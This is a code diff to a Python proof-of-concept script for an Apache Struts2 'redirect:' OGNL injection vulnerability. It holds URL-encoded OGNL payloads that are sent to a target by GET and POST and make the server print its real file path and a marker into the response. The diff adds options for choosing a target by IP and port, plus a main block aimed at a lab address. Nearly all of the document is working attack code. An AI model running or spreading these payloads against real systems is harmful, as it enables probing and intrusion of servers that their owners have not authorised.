@@ -4,13 +4,17 @@ import requests
 warnings.filterwarnings("ignore")
 
 
-def poc(url):
+def poc(url, **kwargs):
+    if kwargs.get('ip'):
+        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
+    else:
+        url = url
     timeout = 10
     proxies = {'http': '127.0.0.1:9999'}
     check = ['\Struts2-vlun-Goop', '/Struts2-vlun-Goop', '-Struts2-vlun-Goop',
              'Unable to initialize device PRN']
     poc_goop = [
-        r"redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22Struts2-vlun-Goop%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
+        r"redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22Struts2-vlun-Goop%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().print(%23b),%23matt.getWriter().print(1116),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D",
         r"redirect%3a%24%7b%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.print%28%27-Struts2-vuln%27%2b%27-Goop%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d"
         # r"redirect:http://www.gooip.club/"
     ]
@@ -22,7 +26,7 @@ def poc(url):
     try:
         for test in poc_goop:
             req_get = requests.get(url + '?' + test, headers=headers, timeout=timeout, verify=False,
-                                   allow_redirects=False,)
+                                   allow_redirects=False)
             req_post = requests.post(url, data=test, headers=headers, timeout=timeout, verify=False,
                                      allow_redirects=False,)
             req_list = [req_get.text, req_post.text, req_get.headers, req_post.headers]
@@ -33,3 +37,6 @@ def poc(url):
                         return result
     except:
         pass
+if __name__ == '__main__':
+    a = poc("http://192.168.106.130:8080/index.action")
+    print(a)
